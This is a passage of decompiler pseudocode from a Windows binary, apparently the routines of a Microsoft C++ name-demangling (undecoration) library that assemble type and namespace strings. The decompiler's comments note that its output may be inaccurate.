      return 0xFFFFFFFFi64;
    return v3;
  }
  else
  {
    result = (unsigned int)(aAvrsafunctionC[25] - 47);
    off_13F1C5F88 = &aAvrsafunctionC[26];
  }
  return result;
}
// 13F164CE1: write access to const memory at 13F1C5F88 has been detected
// 13F164D0D: write access to const memory at 13F1C5F88 has been detected
// 13F164D20: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F164D38) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F164D38(__int64 a1, char a2, _BYTE *a3)
{
  char *v5; // rbx
  int v6; // esi
  char *v7; // rdx
  __int64 v8; // rax
  int v9; // eax
  __int64 v11; // r14
  __int64 v12; // rax
  __int64 v13; // rbx
  __int64 v14; // rax
  __int64 v15; // rcx
  char *v16; // rax
  int v17; // ecx
  char *v18; // rdx
  char *v19; // rdx
  int v20; // ecx
  char *v21; // rdx
  char v22; // al
  int v23; // ecx
  int v24; // ecx
  unsigned __int64 v25; // rdx
  __int64 v26; // rax
  __int64 v27; // rax
  __int64 v28; // rax
  __int64 v29; // rax
  __int64 v30; // rax
  __int64 v31; // rax
  __int64 v32; // rax
  __int64 v33; // rax
  __int64 v34; // rax
  __int64 *v35; // rcx
  __int64 v36; // rax
  int v37; // edx
  char v38; // al
  __int64 v39; // rax
  __int64 v40; // rax
  __int64 v41; // [rsp+20h] [rbp-50h] BYREF
  int v42; // [rsp+28h] [rbp-48h]
  __int64 v43; // [rsp+30h] [rbp-40h] BYREF
  int v44; // [rsp+38h] [rbp-38h]
  __int64 v45; // [rsp+40h] [rbp-30h] BYREF
  int v46; // [rsp+48h] [rbp-28h]
  __int64 v47; // [rsp+50h] [rbp-20h] BYREF
  int v48; // [rsp+58h] [rbp-18h]
  char v49[16]; // [rsp+60h] [rbp-10h] BYREF
  char v50; // [rsp+B8h] [rbp+48h] BYREF

  v41 = 0i64;
  v42 = 0;
  v43 = 0i64;
  v5 = &aAvrsafunctionC[26];
  v44 = 0;
  v6 = 0;
  off_13F1C5F88 = &aAvrsafunctionC[26];
  if ( aAvrsafunctionC[25] > 65 )
  {
    if ( aAvrsafunctionC[25] == 66 )
    {
      v6 = 1;
    }
    else
    {
      if ( aAvrsafunctionC[25] <= 66 )
        goto LABEL_54;
      if ( aAvrsafunctionC[25] > 90 )
      {
        if ( aAvrsafunctionC[25] != 95 )
          goto LABEL_54;
        v17 = *v5;
        v18 = &aAvrsafunctionC[27];
        off_13F1C5F88 = &aAvrsafunctionC[27];
        if ( v17 <= 79 )
        {
          if ( v17 < 68 )
          {
            if ( v17 <= 57 )
            {
              if ( v17 != 57 )
              {
                if ( v17 )
                {
                  if ( v17 <= 47 )
                    goto LABEL_54;
                  if ( v17 <= 54 )
                  {
                    v7 = off_13F18C730[aAvrsafunctionC[26]];
                    goto LABEL_8;
                  }
                  v19 = off_13F18C730[aAvrsafunctionC[26]];
LABEL_42:
                  sub_13F161444(a1, v19);
                  return a1;
                }
LABEL_44:
                v16 = v18 - 1;
                goto LABEL_29;
              }
              sub_13F161444((__int64)&v47, off_13F18C730[aAvrsafunctionC[26]]);
              v20 = v48 | 0x8000;
LABEL_46:
              *(_QWORD *)a1 = v47;
              *(_DWORD *)(a1 + 8) = v20;
              return a1;
            }
            if ( v17 == 63 )
            {
              v22 = *v18;
              v18 = &aAvrsafunctionC[28];
              off_13F1C5F88 = &aAvrsafunctionC[28];
              if ( !v22 )
                goto LABEL_44;
              if ( v22 != 48 )
                goto LABEL_54;
              v21 = "`anonymous namespace'";
              goto LABEL_51;
            }
            if ( v17 <= 64 )
              goto LABEL_54;
            if ( v17 > 66 )
            {
              v21 = "`string'";
LABEL_51:
              sub_13F1662BC((__int64)&v47, v21);
              v20 = v48 | 0x1000;
              goto LABEL_46;
            }
          }
LABEL_99:
          v19 = (char *)*(&std::bad_exception::`vftable' + aAvrsafunctionC[26]);
          goto LABEL_42;
        }
        if ( v17 <= 84 )
        {
          if ( v17 >= 83 )
            goto LABEL_99;
          v23 = v17 - 80;
          if ( v23 )
          {
            v24 = v23 - 1;
            if ( !v24 )
            {
LABEL_9:
              if ( v41 )
              {
                v8 = sub_13F161444((__int64)v49, "operator");
                sub_13F1616BC(v8, (__int64)&v47, (__int64)&v41);
                v41 = v47;
                v42 = v48;
              }
              goto LABEL_11;
            }
            if ( v24 != 1 )
              goto LABEL_54;
            sub_13F161644((__int64)&v41, (char *)*(&std::bad_exception::`vftable' + aAvrsafunctionC[26]));
            if ( !aAvrsafunctionC[25] )
            {
              sub_13F161740((__int64)&v41, a1, 1u);
              return a1;
            }
            if ( aAvrsafunctionC[25] < 48 )
              goto LABEL_54;
            v25 = aAvrsafunctionC[25] - 48i64;
            if ( v25 >= 5 )
              goto LABEL_54;
            sub_13F161644((__int64)&v43, off_13F18CA30[v25]);
            off_13F1C5F88 = &aAvrsafunctionC[26];
            if ( aAvrsafunctionC[25] == 48 )
            {
              sub_13F163AEC((__int64)&v47, 0i64);
              v34 = sub_13F1616E8((__int64)&v47, (__int64)v49, 32);
              v35 = (__int64 *)sub_13F1616BC(v34, (__int64)&v45, (__int64)&v41);
LABEL_72:
              sub_13F1616BC((__int64)v35, a1, (__int64)&v43);
              return a1;
            }
            if ( aAvrsafunctionC[25] == 49 )
            {
              sub_13F1616BC((__int64)&v41, (__int64)&v45, (__int64)&v43);
              v26 = sub_13F166084((__int64)v49);
              v27 = sub_13F1616E8(v26, (__int64)&v47, 44);
              sub_13F16176C((__int64)&v45, v27);
              v28 = sub_13F166084((__int64)v49);
              v29 = sub_13F1616E8(v28, (__int64)&v47, 44);
              sub_13F16176C((__int64)&v45, v29);
              v30 = sub_13F166084((__int64)v49);
              v31 = sub_13F1616E8(v30, (__int64)&v47, 44);
              sub_13F16176C((__int64)&v45, v31);
              v32 = sub_13F163E7C((__int64)v49, 0);
              v33 = sub_13F1616E8(v32, (__int64)&v47, 41);
              sub_13F16176C((__int64)&v45, v33);
              sub_13F1616E8((__int64)&v45, a1, 39);
              return a1;
            }
            if ( aAvrsafunctionC[25] <= 49 || aAvrsafunctionC[25] > 52 )
            {
              v16 = "";
              goto LABEL_29;
            }
          }
          else
          {
            sub_13F161644((__int64)&v41, (char *)*(&std::bad_exception::`vftable' + aAvrsafunctionC[26]));
            v36 = sub_13F164D38((__int64)v49, 0, 0i64);
            v37 = *(_DWORD *)(v36 + 8);
            v43 = *(_QWORD *)v36;
            v44 = v37;
            if ( v43 && (v37 & 0x400) != 0 )
              goto LABEL_54;
          }
          v35 = &v41;
          goto LABEL_72;
        }
        if ( v17 <= 86 )
        {
          v7 = (char *)*(&std::bad_exception::`vftable' + aAvrsafunctionC[26]);
          goto LABEL_8;
        }
        if ( v17 <= 87 )
          goto LABEL_54;
        if ( v17 <= 89 )
          goto LABEL_99;
        if ( v17 != 95 )
          goto LABEL_54;
        v38 = *v18;
        off_13F1C5F88 = &aAvrsafunctionC[28];
        if ( v38 < 65 )
          goto LABEL_54;
        if ( v38 > 68 )
        {
          if ( v38 <= 70 )
          {
            sub_13F161444((__int64)&v45, (&off_13F18C7C0)[aAvrsafunctionC[27]]);
            if ( aAvrsafunctionC[25] == 63 )
            {
              v39 = sub_13F163BD4((__int64)v49);
              sub_13F16176C((__int64)&v45, v39);
              if ( aAvrsafunctionC[25] == 64 )
                off_13F1C5F88 = &aAvrsafunctionC[26];
            }
            else
            {
              v40 = sub_13F16638C((__int64)v49);
              sub_13F16176C((__int64)&v45, v40);
            }
            sub_13F161830((__int64)&v45, "''");
            goto LABEL_93;
          }
          if ( v38 > 74 )
          {
            if ( v38 != 75 )
            {
              if ( v38 != 76 )
                goto LABEL_54;
              goto LABEL_86;
            }
            sub_13F161444((__int64)&v45, (&off_13F18C7C0)[aAvrsafunctionC[27]]);
            while ( aAvrsafunctionC[25] )
            {
              if ( aAvrsafunctionC[25] == 64 )
                goto LABEL_92;
              off_13F1C5F88 = &aAvrsafunctionC[26];
              sub_13F1617B0((__int64)&v45, aAvrsafunctionC[25]);
            }
            if ( aAvrsafunctionC[25] != 64 )
              goto LABEL_93;
LABEL_92:
            off_13F1C5F88 = &aAvrsafunctionC[26];
LABEL_93:
            *(_QWORD *)a1 = v45;
            v9 = v46;
            goto LABEL_12;
          }
        }
LABEL_86:
        v19 = (&off_13F18C7C0)[aAvrsafunctionC[27]];
        goto LABEL_42;
      }
    }
LABEL_102:
    sub_13F161644((__int64)&v41, (char *)qword_13F18C5D8[aAvrsafunctionC[25]]);
    if ( v6 )
    {
      if ( v41 )
        v42 |= 0x200u;
      goto LABEL_11;
    }
    goto LABEL_9;
  }
  if ( aAvrsafunctionC[25] == 65 )
    goto LABEL_102;
  if ( !aAvrsafunctionC[25] )
  {
    v16 = "";
LABEL_29:
    off_13F1C5F88 = v16;
    *(_QWORD *)a1 = qword_13F18D620;
    *(_DWORD *)(a1 + 8) = 0;
    return a1;
  }
  if ( aAvrsafunctionC[25] <= 47 )
    goto LABEL_54;
  if ( aAvrsafunctionC[25] > 49 )
  {
    if ( aAvrsafunctionC[25] <= 57 )
    {
      v7 = (char *)qword_13F18C610[aAvrsafunctionC[25]];
LABEL_8:
      sub_13F161644((__int64)&v41, v7);
      goto LABEL_9;
    }
LABEL_54:
    *(_DWORD *)(a1 + 8) = 0;
    *(_BYTE *)(a1 + 8) = 2;
    *(_QWORD *)a1 = 0i64;
    return a1;
  }
  v43 = 0i64;
  v11 = 0i64;
  v44 = 0;
  if ( a2 )
  {
    v12 = sub_13F1663D8((__int64)v49);
    v50 = 60;
    v45 = 0i64;
    v46 = 0;
    v13 = v12;
    sub_13F1627A8((__int64)&v45, &v50, 1u);
    sub_13F1616BC((__int64)&v45, (__int64)&v47, v13);
    sub_13F16176C((__int64)&v43, (__int64)&v47);
    if ( v43 && (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v43 + 8i64))(v43) == 62 )
      sub_13F1617B0((__int64)&v43, 32);
    sub_13F1617B0((__int64)&v43, 62);
    if ( a3 )
      *a3 = 1;
    if ( !aAvrsafunctionC[25] )
    {
      *(_QWORD *)a1 = v43;
      v9 = v44;
      goto LABEL_12;
    }
    v11 = v43;
    v5 = &aAvrsafunctionC[26];
    off_13F1C5F88 = &aAvrsafunctionC[26];
  }
  v14 = sub_13F167320((__int64)v49, 0, 0);
  v15 = *(_QWORD *)v14;
  LODWORD(v14) = *(_DWORD *)(v14 + 8);
  v41 = v15;
  v42 = v14;
  off_13F1C5F88 = v5;
  if ( v15 && *(v5 - 1) == 49 )
  {
    v50 = 126;
    v45 = 0i64;
    v46 = 0;
    sub_13F1627A8((__int64)&v45, &v50, 1u);
    sub_13F1616BC((__int64)&v45, (__int64)&v47, (__int64)&v41);
    v41 = v47;
    v42 = v48;
  }
  if ( v11 )
    sub_13F16176C((__int64)&v41, (__int64)&v43);
LABEL_11:
  *(_QWORD *)a1 = v41;
  v9 = v42;
LABEL_12:
  *(_DWORD *)(a1 + 8) = v9;
  return a1;
}
// 13F164D7D: write access to const memory at 13F1C5F88 has been detected
// 13F164EE7: write access to const memory at 13F1C5F88 has been detected
// 13F164F09: write access to const memory at 13F1C5F88 has been detected
// 13F164F75: write access to const memory at 13F1C5F88 has been detected
// 13F164FB7: write access to const memory at 13F1C5F88 has been detected
// 13F1650A6: write access to const memory at 13F1C5F88 has been detected
// 13F165177: write access to const memory at 13F1C5F88 has been detected
// 13F16530B: write access to const memory at 13F1C5F88 has been detected
// 13F165382: write access to const memory at 13F1C5F88 has been detected
// 13F1653A3: write access to const memory at 13F1C5F88 has been detected
// 13F165406: write access to const memory at 13F1C5F88 has been detected
// 13F164FF0: conditional instruction was optimized away because ecx.4 is in (37..38)
// 13F165082: conditional instruction was optimized away because ecx.4==43
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18C5D8: using guessed type __int64 qword_13F18C5D8[];
// 13F18C610: using guessed type __int64 qword_13F18C610[];
// 13F18C6F8: using guessed type void *std::bad_exception::`vftable';
// 13F18C730: using guessed type char *off_13F18C730[13];
// 13F18C7C0: using guessed type char *off_13F18C7C0;
// 13F18CA30: using guessed type char *off_13F18CA30[2];
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F1654A8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1654A8(__int64 a1, __int64 a2)
{
  char *v3; // rdx
  __int64 v5; // rdx
  char *v6; // r9
  int v7; // eax
  char v8; // al
  __int64 **v9; // rcx
  __int64 v11; // [rsp+30h] [rbp-20h] BYREF
  int v12; // [rsp+38h] [rbp-18h]
  __int64 *v13; // [rsp+40h] [rbp-10h] BYREF
  int v14; // [rsp+48h] [rbp-8h]

  v3 = "";
  v11 = 0i64;
  v12 = 0;
  switch ( aAvrsafunctionC[25] )
  {
    case 0:
      goto LABEL_14;
    case 36:
      v8 = aAvrsafunctionC[26];
      if ( v8 != 36 )
      {
        if ( !v8 )
        {
LABEL_14:
          v14 = 0;
          v13 = qword_13F18D620;
          v9 = &v13;
LABEL_15:
          sub_13F1616BC((__int64)v9, a1, a2);
          return a1;
        }
LABEL_26:
        *(_DWORD *)(a1 + 8) = 0;
        *(_BYTE *)(a1 + 8) = 2;
        *(_QWORD *)a1 = 0i64;
        return a1;
      }
      v3 = &aAvrsafunctionC[27];
      off_13F1C5F88 = &aAvrsafunctionC[27];
      switch ( aAvrsafunctionC[27] )
      {
        case 0:
          goto LABEL_14;
        case 65:
          off_13F1C5F88 = &aAvrsafunctionC[28];
          sub_13F16457C(a1, a2);
          return a1;
        case 66:
          off_13F1C5F88 = &aAvrsafunctionC[28];
          sub_13F1656F8(a1, a2, 1);
          return a1;
        case 67:
          v13 = 0i64;
          off_13F1C5F88 = &aAvrsafunctionC[28];
          v14 = 0;
          v5 = sub_13F163334((__int64)&v11, a2, byte_13F19C050, &v13, 0);
          goto LABEL_6;
      }
      if ( aAvrsafunctionC[27] != 81 )
      {
        if ( aAvrsafunctionC[27] != 82 )
        {
          switch ( aAvrsafunctionC[27] )
          {
            case 'S':
              off_13F1C5F88 = &aAvrsafunctionC[28];
              break;
            case 'T':
              off_13F1C5F88 = &aAvrsafunctionC[28];
              if ( !*(_QWORD *)a2 )
              {
                sub_13F161444(a1, "std::nullptr_t");
                return a1;
              }
              v9 = (__int64 **)sub_13F161444((__int64)&v13, "std::nullptr_t ");
              goto LABEL_15;
            case 'Y':
              off_13F1C5F88 = &aAvrsafunctionC[28];
              sub_13F165F80(a1);
              return a1;
          }
          goto LABEL_26;
        }
        sub_13F161644((__int64)&v11, "volatile");
        if ( *(_QWORD *)a2 )
          sub_13F1617B0((__int64)&v11, 32);
        v3 = "";
      }
      v6 = (char *)qword_13F18CBB0;
      goto LABEL_11;
    case 65:
LABEL_10:
      v6 = "&";
LABEL_11:
      v13 = *(__int64 **)a2;
      v7 = *(_DWORD *)(a2 + 8) | 0x100;
      off_13F1C5F88 = v3 + 1;
      v14 = v7;
      sub_13F16585C(a1, &v11, (__int64)&v13, v6);
      return a1;
    case 66:
      sub_13F161644((__int64)&v11, "volatile");
      if ( *(_QWORD *)a2 )
        sub_13F1617B0((__int64)&v11, 32);
      v3 = "";
      goto LABEL_10;
  }
  v5 = a2;
LABEL_6:
  sub_13F162D8C(a1, v5);
  return a1;
}
// 13F165545: write access to const memory at 13F1C5F88 has been detected
// 13F16559E: write access to const memory at 13F1C5F88 has been detected
// 13F1655F7: write access to const memory at 13F1C5F88 has been detected
// 13F16560C: write access to const memory at 13F1C5F88 has been detected
// 13F165648: write access to const memory at 13F1C5F88 has been detected
// 13F16568F: write access to const memory at 13F1C5F88 has been detected
// 13F1656C6: write access to const memory at 13F1C5F88 has been detected
// 13F1656E4: write access to const memory at 13F1C5F88 has been detected
// 13F18CBB0: using guessed type __int64 qword_13F18CBB0[13];
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F1656F8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1656F8(__int64 a1, __int64 a2, int a3)
{
  char *v3; // rax
  char *v6; // rdx
  char *v7; // rdx
  __int64 **v8; // rcx
  char *v9; // rdx
  __int64 v10; // rax
  __int64 *v11; // rax
  int v12; // ecx
  __int64 *v14; // [rsp+20h] [rbp-30h] BYREF
  int v15; // [rsp+28h] [rbp-28h]
  __int64 *v16; // [rsp+30h] [rbp-20h] BYREF
  int v17; // [rsp+38h] [rbp-18h]
  char v18[16]; // [rsp+40h] [rbp-10h] BYREF

  v3 = "";
  if ( !aAvrsafunctionC[25] )
  {
    v17 = 0;
    v16 = qword_13F18D620;
    v8 = &v16;
    goto LABEL_29;
  }
  if ( !a3 )
  {
LABEL_13:
    if ( *v3 == 36 && v3[1] == 36 && v3[2] == 84 )
    {
      off_13F1C5F88 = v3 + 3;
      if ( !*(_QWORD *)a2 )
      {
        v6 = "std::nullptr_t";
        goto LABEL_6;
      }
      v7 = "std::nullptr_t ";
      goto LABEL_8;
    }
    if ( *v3 == 89 )
    {
      off_13F1C5F88 = v3 + 1;
      sub_13F162A70(a1, a2);
      return a1;
    }
    sub_13F162D8C((__int64)&v14, a2);
    if ( (*(_DWORD *)(a2 + 8) & 0x4000) != 0 )
    {
      v9 = "cli::array<";
    }
    else
    {
      if ( (*(_DWORD *)(a2 + 8) & 0x2000) == 0 )
      {
        v12 = v15;
        v11 = v14;
        goto LABEL_27;
      }
      v9 = "cli::pin_ptr<";
    }
    v10 = sub_13F161444((__int64)v18, v9);
    sub_13F1616BC(v10, (__int64)&v16, (__int64)&v14);
    v11 = v16;
    v12 = v17;
LABEL_27:
    *(_QWORD *)a1 = v11;
    *(_DWORD *)(a1 + 8) = v12;
    return a1;
  }
  if ( aAvrsafunctionC[25] != 88 )
  {
    if ( aAvrsafunctionC[25] == 95 && aAvrsafunctionC[26] == 95 && aAvrsafunctionC[27] == 90 )
    {
      v3 = &aAvrsafunctionC[28];
      off_13F1C5F88 = &aAvrsafunctionC[28];
    }
    goto LABEL_13;
  }
  off_13F1C5F88 = &aAvrsafunctionC[26];
  if ( *(_QWORD *)a2 )
  {
    v7 = "void ";
LABEL_8:
    v8 = (__int64 **)sub_13F161444((__int64)&v16, v7);
LABEL_29:
    sub_13F1616BC((__int64)v8, a1, a2);
    return a1;
  }
  v6 = "void";
LABEL_6:
  sub_13F161444(a1, v6);
  return a1;
}
// 13F16572E: write access to const memory at 13F1C5F88 has been detected
// 13F16577B: write access to const memory at 13F1C5F88 has been detected
// 13F165797: write access to const memory at 13F1C5F88 has been detected
// 13F1657C0: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1656F8: using guessed type char var_10[16];

//----- (000000013F16585C) ----------------------------------------------------
__int64 __fastcall sub_13F16585C(__int64 a1, _QWORD *a2, __int64 a3, char *a4)
{
  int v5; // ebx
  __int64 *v10; // [rsp+30h] [rbp-10h] BYREF
  int v11; // [rsp+38h] [rbp-8h]

  v5 = 0;
  if ( aAvrsafunctionC[25] )
  {
    if ( (unsigned __int8)(aAvrsafunctionC[25] - 54) <= 3u || aAvrsafunctionC[25] == 95 )
    {
      sub_13F161444((__int64)&v10, a4);
      if ( *a2 && (!*(_QWORD *)a3 || (*(_DWORD *)(a3 + 8) & 0x100) == 0) )
        sub_13F16176C((__int64)&v10, (__int64)a2);
      if ( *(_QWORD *)a3 )
        sub_13F16176C((__int64)&v10, a3);
      sub_13F16457C(a1, (__int64)&v10);
    }
    else
    {
      sub_13F163334((__int64)&v10, a3, a4, a2, 0);
      LOBYTE(v5) = *a4 == 42;
      sub_13F1656F8(a1, (__int64)&v10, v5);
    }
  }
  else
  {
    v11 = 0;
    v10 = qword_13F18D620;
    sub_13F161830((__int64)&v10, a4);
    if ( *a2 )
      sub_13F16176C((__int64)&v10, (__int64)a2);
    if ( *(_QWORD *)a3 )
    {
      if ( *a2 )
        sub_13F1617B0((__int64)&v10, 32);
      sub_13F16176C((__int64)&v10, a3);
    }
    *(_QWORD *)a1 = v10;
    *(_DWORD *)(a1 + 8) = v11;
  }
  return a1;
}
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F165994) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F165994(__int64 a1)
{
  char *v2; // rax
  unsigned int v3; // ebp
  char *v4; // rdx
  int v5; // ecx
  __int64 v7; // [rsp+20h] [rbp-18h] BYREF
  int v8; // [rsp+28h] [rbp-10h]

  if ( aAvrsafunctionC[25] == 95 && (v2 = &aAvrsafunctionC[26], aAvrsafunctionC[26]) && *v2 <= 68 )
  {
    off_13F1C5F88 = &aAvrsafunctionC[26];
    v3 = *v2 - 65;
    off_13F1C5F88 = &aAvrsafunctionC[27];
    if ( v3 > 3 )
    {
LABEL_13:
      *(_DWORD *)(a1 + 8) = 0;
      *(_BYTE *)(a1 + 8) = 2;
      *(_QWORD *)a1 = 0i64;
    }
    else
    {
      v7 = 0i64;
      v8 = 0;
      sub_13F161830((__int64)&v7, " ");
      sub_13F161830((__int64)&v7, "restrict(");
      if ( v3 )
      {
        while ( 1 )
        {
          if ( (v3 & -v3) == 1 )
          {
            v4 = "cpu";
          }
          else
          {
            if ( (v3 & -v3) != 2 )
              goto LABEL_13;
            v4 = "amp";
          }
          sub_13F161830((__int64)&v7, v4);
          v3 &= ~(v3 & -v3);
          if ( !v3 )
            break;
          sub_13F161830((__int64)&v7, ", ");
        }
      }
      sub_13F1617B0((__int64)&v7, 41);
      v5 = v8;
      *(_QWORD *)a1 = v7;
      *(_DWORD *)(a1 + 8) = v5;
    }
  }
  else
  {
    *(_QWORD *)a1 = 0i64;
    *(_DWORD *)(a1 + 8) = 0;
  }
  return a1;
}
// 13F1659D2: write access to const memory at 13F1C5F88 has been detected
// 13F1659E2: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F165AD4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F165AD4(__int64 a1, __int64 a2)
{
  if ( aAvrsafunctionC[25] == 64 )
  {
    off_13F1C5F88 = &aAvrsafunctionC[26];
    sub_13F1613C0(a1, a2);
  }
  else
  {
    sub_13F163AEC(a1, a2);
  }
  return a1;
}
// 13F165AEC: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F165B08) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F165B08(__int64 a1)
{
  char v2; // si
  __int64 v3; // rax
  __int64 v4; // rax
  char *v5; // rdx
  __int64 v6; // rbx
  int v7; // eax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  __int64 v16; // rax
  __int64 v17; // rbx
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rax
  __int64 v22; // [rsp+20h] [rbp-E0h] BYREF
  int v23; // [rsp+28h] [rbp-D8h]
  __int64 *v24; // [rsp+30h] [rbp-D0h] BYREF
  int v25; // [rsp+38h] [rbp-C8h]
  __int64 v26; // [rsp+40h] [rbp-C0h] BYREF
  int v27; // [rsp+48h] [rbp-B8h]
  __int64 v28; // [rsp+50h] [rbp-B0h] BYREF
  int v29; // [rsp+58h] [rbp-A8h]
  __int64 v30; // [rsp+60h] [rbp-A0h] BYREF
  int v31; // [rsp+68h] [rbp-98h]
  __int64 v32; // [rsp+70h] [rbp-90h] BYREF
  int v33; // [rsp+78h] [rbp-88h]
  __int64 v34; // [rsp+80h] [rbp-80h] BYREF
  int v35; // [rsp+88h] [rbp-78h]
  __int64 v36; // [rsp+90h] [rbp-70h] BYREF
  int v37; // [rsp+98h] [rbp-68h]
  char v38[16]; // [rsp+A0h] [rbp-60h] BYREF
  char v39[16]; // [rsp+B0h] [rbp-50h] BYREF
  char v40[16]; // [rsp+C0h] [rbp-40h] BYREF
  char v41[16]; // [rsp+D0h] [rbp-30h] BYREF
  char v42[16]; // [rsp+E0h] [rbp-20h] BYREF
  char v43[16]; // [rsp+F0h] [rbp-10h] BYREF
  char v44[16]; // [rsp+100h] [rbp+0h] BYREF
  char v45; // [rsp+110h] [rbp+10h] BYREF
  char v46[16]; // [rsp+120h] [rbp+20h] BYREF
  char v47[16]; // [rsp+130h] [rbp+30h] BYREF
  char v48[16]; // [rsp+140h] [rbp+40h] BYREF
  char v49[16]; // [rsp+150h] [rbp+50h] BYREF
  char v50[16]; // [rsp+160h] [rbp+60h] BYREF
  char v51[16]; // [rsp+170h] [rbp+70h] BYREF
  char v52[16]; // [rsp+180h] [rbp+80h] BYREF
  char v53[16]; // [rsp+190h] [rbp+90h] BYREF
  char v54[16]; // [rsp+1A0h] [rbp+A0h] BYREF
  char v55[16]; // [rsp+1B0h] [rbp+B0h] BYREF
  char v56; // [rsp+1C0h] [rbp+C0h] BYREF
  char v57[16]; // [rsp+1D0h] [rbp+D0h] BYREF
  char v58[16]; // [rsp+1E0h] [rbp+E0h] BYREF
  char v59; // [rsp+1F0h] [rbp+F0h] BYREF
  char v60; // [rsp+220h] [rbp+120h] BYREF

  *(_QWORD *)a1 = 0i64;
  v2 = 0;
  *(_DWORD *)(a1 + 8) = 0;
  while ( (aAvrsafunctionC[25] & 0xBF) != 0 )
  {
    if ( *(_QWORD *)a1 )
    {
      v3 = sub_13F161444((__int64)v43, "::");
      sub_13F1616BC(v3, (__int64)&v34, a1);
      *(_QWORD *)a1 = v34;
      *(_DWORD *)(a1 + 8) = v35;
      if ( v2 )
      {
        v60 = 91;
        v26 = 0i64;
        v27 = 0;
        sub_13F1627A8((__int64)&v26, &v60, 1u);
        sub_13F1616BC((__int64)&v26, (__int64)&v36, a1);
        v2 = 0;
        *(_QWORD *)a1 = v36;
        *(_DWORD *)(a1 + 8) = v37;
      }
    }
    if ( aAvrsafunctionC[25] != 63 )
    {
      v4 = sub_13F167320((__int64)v41, 1, 0);
      v5 = v42;
      goto LABEL_35;
    }
    off_13F1C5F88 = &aAvrsafunctionC[26];
    switch ( aAvrsafunctionC[26] )
    {
      case '$':
        off_13F1C5F88 = "";
        v4 = sub_13F167320((__int64)v58, 1, 0);
        v5 = &v59;
LABEL_35:
        v13 = sub_13F1616BC(v4, (__int64)v5, a1);
        goto LABEL_36;
      case '%':
        goto LABEL_31;
      case '?':
        if ( aAvrsafunctionC[27] == 95 && aAvrsafunctionC[28] == 63 )
        {
          off_13F1C5F88 = &aAvrsafunctionC[27];
          v14 = sub_13F164D38((__int64)v52, 0, 0i64);
          v15 = sub_13F1616BC(v14, (__int64)v53, a1);
          *(_QWORD *)a1 = *(_QWORD *)v15;
          *(_DWORD *)(a1 + 8) = *(_DWORD *)(v15 + 8);
          if ( aAvrsafunctionC[25] == 64 )
LABEL_29:
            off_13F1C5F88 = &aAvrsafunctionC[26];
          goto LABEL_37;
        }
        v16 = sub_13F163BD4((__int64)v54);
        v60 = 96;
        v32 = 0i64;
        v33 = 0;
        v17 = v16;
        sub_13F1627A8((__int64)&v32, &v60, 1u);
        sub_13F1616BC((__int64)&v32, (__int64)v39, v17);
        v4 = sub_13F1616E8((__int64)v39, (__int64)v55, 39);
        v5 = &v56;
        goto LABEL_35;
      case 'A':
LABEL_31:
        sub_13F1612F4((__int64)v40, (char **)&off_13F1C5F88, 64);
        v18 = sub_13F161444((__int64)v57, "`anonymous namespace'");
        sub_13F1616BC(v18, (__int64)&v24, a1);
        *(_QWORD *)a1 = v24;
        *(_DWORD *)(a1 + 8) = v25;
        if ( MEMORY[0x20EAD8] != 9 )
          sub_13F161928((int *)0x20EAD8, (__int64)v40);
        goto LABEL_37;
    }
    if ( aAvrsafunctionC[26] != 73 )
    {
      if ( aAvrsafunctionC[26] == 81 )
      {
        v6 = 0i64;
        v23 = 0;
        v22 = 0i64;
        off_13F1C5F88 = &aAvrsafunctionC[27];
        while ( 1 )
        {
          sub_13F167320((__int64)&v28, 1, 0);
          v7 = v29;
          if ( (_BYTE)v29 )
          {
            v23 = 2;
            v6 = 0i64;
          }
          else
          {
            if ( v6 )
            {
              v8 = sub_13F161714((__int64)&v28, (__int64)v46, "::");
              v9 = sub_13F1616BC(v8, (__int64)v47, (__int64)&v22);
              v6 = *(_QWORD *)v9;
              v7 = *(_DWORD *)(v9 + 8);
            }
            else
            {
              v6 = v28;
            }
            v23 = v7;
          }
          v22 = v6;
          if ( (_BYTE)v23 )
            break;
          if ( aAvrsafunctionC[25] == 64 )
          {
            v60 = 91;
            v30 = 0i64;
            v31 = 0;
            sub_13F1627A8((__int64)&v30, &v60, 1u);
            sub_13F1616BC((__int64)&v30, (__int64)v38, (__int64)&v22);
            v10 = sub_13F1616E8((__int64)v38, (__int64)v48, 93);
            *(_QWORD *)a1 = *(_QWORD *)v10;
            *(_DWORD *)(a1 + 8) = *(_DWORD *)(v10 + 8);
            goto LABEL_29;
          }
        }
        *(_DWORD *)(a1 + 8) = 0;
        *(_BYTE *)(a1 + 8) = 2;
        *(_QWORD *)a1 = 0i64;
        goto LABEL_37;
      }
      v4 = sub_13F164B5C((__int64)v44);
      v5 = &v45;
      goto LABEL_35;
    }
    off_13F1C5F88 = &aAvrsafunctionC[27];
    v11 = sub_13F167320((__int64)v49, 1, 0);
    v12 = sub_13F1616E8(v11, (__int64)v50, 93);
